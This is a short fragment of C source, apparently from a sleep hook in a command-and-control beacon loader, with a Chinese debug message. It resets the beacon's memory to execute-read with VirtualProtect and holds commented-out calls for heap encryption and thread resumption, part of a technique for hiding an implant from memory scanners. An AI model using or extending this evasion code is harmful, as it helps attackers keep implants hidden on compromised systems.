        printf("[+]修改beacon属性为RX: address 0x%p\n", beacon.address);
        VirtualProtect(beacon.address, beacon.size, PAGE_EXECUTE_READ, &oldProt);
        //HeapEncryptDecrypt();
        //DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
    }
    else {
        OldSleep(time);
    }
}

